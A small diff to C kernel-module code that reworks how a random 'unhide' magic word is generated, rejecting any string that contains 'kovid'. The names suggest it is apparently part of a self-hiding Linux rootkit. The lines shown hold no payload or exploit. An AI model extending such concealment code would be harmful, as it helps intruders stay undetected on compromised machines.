@@ -339,8 +339,23 @@ out_put_kobj:
 
 static char *get_unhide_magic_word(void) {
     static char *magic_word;
-    if(!magic_word)
-        magic_word = kv_util_random_AZ_string(MAX_MAGIC_WORD_SIZE);
+
+    if(!magic_word) {
+        char *m = NULL;
+
+        /** must be pretty unlucky
+         * for this to be forever loop
+         */
+        do {
+            if (m) {
+                kfree(m);
+                m = NULL;
+            }
+            m = kv_util_random_AZ_string(MAX_MAGIC_WORD_SIZE);
+        } while(strstr(m, "kovid"));
+
+        magic_word = m;
+    }
 
     /* magic_word must be freed later */
     return magic_word;
